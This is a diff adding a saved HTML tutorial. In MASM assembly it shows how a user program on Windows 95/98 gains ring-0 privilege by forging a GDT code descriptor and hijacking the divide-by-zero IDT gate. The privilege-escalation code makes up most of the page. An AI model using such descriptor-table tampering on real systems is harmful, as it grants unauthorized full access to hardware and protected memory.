@@ -1,0 +1,130 @@
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.0 Transitional//EN">
+<!-- saved from url=(0052)http://phantom.urbis.net.il/bphantom/Win32_CPL0.html -->
+<HTML><HEAD><TITLE>How To Get To CPL 0 under Windows 95</TITLE>
+<META content="text/html; charset=windows-1250" 
+http-equiv=Content-Type><BASEFONT face="times new roman">
+<META content="MSHTML 5.00.2614.3500" name=GENERATOR></HEAD>
+<BODY>
+<P>
+<H1><U>How To Get To CPL 0 under Windows 95.</U></H1>
+<HR>
+
+<P><B><I>
+<DD>This document describes a method to get to CPL 0 for Win32 programs under 
+Windows 95/98. Assumptions made on an auditory are: knowledge of x86 CPU 
+operation in protected mode; knowledge of its assembly language; knowledge of 
+Win32 programming model (flat); knowledge of MASM syntax</I></B> 
+<P>
+<HR>
+
+<P>
+<OL>
+  <H2>
+  <LI>Get GDT base address to some variable.</H2><CODE><PRE>.data
+GdtLimit	DW ? 	; GDT limit (size-1)
+GdtBase  	DD ? 	; GDT base address
+
+.code
+sgdt 	fword ptr GdtLimit
+</PRE></CODE>
+  <P>
+  <H2>
+  <LI>You need an unused GDT descriptor.</H2>
+  <DD>More likely the last will be unused but it's a good idea to check it with 
+  a debugger. Below I assume that the last is unused (Windows writers seemed to 
+  reserve some amount of GDT descriptors for unknown reason). It will become 
+  your new code segment on level 0. NOTE: I never tested what will happen if you 
+  modify your current code descriptor. May be it will still work. 
+  <P><CODE><PRE>.data
+LastSelector 	DW ? 	; Selector for the new code segment.
+
+.code
+movzx 	eax, GdtLimit
+xor 	eax, 7
+test 	eax, 7
+jz 	done
+and 	eax, 0FFF8h
+sub 	eax, 8
+done:
+mov 	LastSelector, ax ; store last selector value
+add 	eax, GdtBase
+</PRE></CODE>
+  <P>
+  <H2></DD>
+  <LI>Copy the current code descriptor to there.</H2>Now DS:EAX point to the 
+  last descriptor. 
+  <P><CODE><PRE>.code
+sub 	ecx, ecx
+mov 	cx, cs
+and 	ecx, 0FFF8h
+add 	ecx, GdtBase    ; Now DS:ECX points to code descriptor
+mov 	edx, [ecx]
+mov 	[eax], edx
+mov 	edx, [ecx+4]
+mov 	[eax+4], edx   	; copy
+</PRE></CODE>
+  <P>
+  <H2>
+  <LI>Modify access rights for the new code segment to set its DPL = 
+  0.</H2><CODE><PRE>and 	byte ptr [eax+5], 10011111b
+</PRE></CODE>
+  <P>
+  <H2>
+  <LI>Transfer Control To CPL 0 Segment.</H2>
+  <DD>Now once you have your code segment with level0 privileges, you want to 
+  transfer control to it. To do so, let's modify IDT exception 0 (division by 0) 
+  gate and have it point to your code. We will use the fact that IDT is also not 
+  protected by Windows from user-level access. 
+  <P><CODE><PRE>.data
+IdtLimit 	DW 	?
+IdtBase  	DD 	?
+OldInt0 	DD 	?
+             	DD 	?
+
+.code
+sidt 	fword ptr IdtLimit
+mov 	eax, IdtBase
+
+; now we'll save original exception 0 handler.
+mov 	ecx, [eax]
+mov 	OldInt0, ecx
+mov 	ecx, [eax+4]
+mov 	OldInt0[4], ecx
+
+; now modify int 0 gate to have it point to our code segment on level 0.
+mov 	cx, LastSelector
+mov 	[eax+2], cx 	; Set selector
+mov 	ecx, offset int_0_handler
+mov 	[eax], cx   	; Set low word of offset
+shr 	ecx, 16
+mov 	[eax+6], cx ; Set high word of offset
+
+; Now as exception 0 gate is set, enter the gate.
+sub 	eax, eax
+div 	eax
+
+int_0_handler:
+; Now restore original exception 0 gate - we don't need it anymore
+mov 	eax, IdtBase
+
+mov 	ecx, OldInt0
+mov 	[eax], ecx
+mov 	ecx, OldInt0[4]
+mov 	[eax+4], ecx
+</PRE></CODE>
+  <P>
+  <H2></DD>
+  <LI>Done</H2>
+  <DD>Now you have your code running on the same address but with level 0 
+  privileges. This allows you access to all the system - I/O ports, system 
+  instructions and protected memory. you may do I/O to any port without being 
+  trapped. You may try to trap other's accesses to ports setting hardware 
+  breakpoints on ports (for Pentium or more recent CPU only). 
+  <P></P></DD></LI></OL>
+<HR>
+
+<P><I>This page is created using Microsoft(R) Notepad. Visited by 520 souls 
+since creation of the world </I>
+<P>
+<HR>
+</DD></BODY></BASEFONT></HTML>
